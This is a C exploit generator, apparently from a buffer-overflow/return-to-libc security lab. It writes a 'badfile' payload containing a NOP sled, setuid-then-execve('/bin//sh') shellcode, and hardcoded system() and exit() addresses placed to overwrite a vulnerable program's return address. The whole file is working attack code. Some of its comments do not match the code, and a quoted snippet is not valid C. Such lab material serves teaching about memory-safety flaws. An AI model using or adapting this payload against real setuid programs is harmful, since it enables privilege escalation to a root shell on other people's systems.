/* exploit.c  */

/* A program that creates a file containing code for launching shell.
   Complilation is: gcc -o bin/exploit exploit.c.
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\xb0\xd5"             /* movb    0$xd5, %al             */
    "\xcd\x80"             /* int     $0x80                  */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    // This program does exactly the same thing as exploit.py does. */
    int fsize = 517;
    int l = strlen(shellcode);
    char buffer[fsize];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, fsize);   // Kool!

    /* Now that we have the buffer initialized with NOP (0x90), we
       update the code string so as to put the shell code on the very
       end of the buffer. The offset is the disance in bytes between
       the start of the buffer in bof() and ebp. The addresses of each
       were obtained with gdb on the stack executable. We add 4 bytes
       to the offset to put us at the beginning of the return address
       location on the stack. The address value is the address of ebp
       plus a value large enough to have the return address land in our
       NOP section that will be written to the stack.  */ 
    memcpy(&buffer[fsize - l], shellcode, l);

    int offset = 72 + 4;
    int pad = 0;
    long system_addr = 0xb7e42da0;
    long exit_addr = 0xb7e369d0;
    long shell_addr = 0xbffffdf1;
    memcpy(&buffer[offset + pad], &system_addr, 4); pad += 4;
    memcpy(&buffer[offset + pad], &exit_addr, 4); pad += 4;
    memcpy(&buffer[offset + pad], &shell_addr, 4);

    /* In the lab document, this is how the author stored the address in
       the string:
       char buffer[20];
       long addr = 0xbfffeac8;
       long *ptr = (long*) buffer + (buffer i);
       *ptr = addr;
    */

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

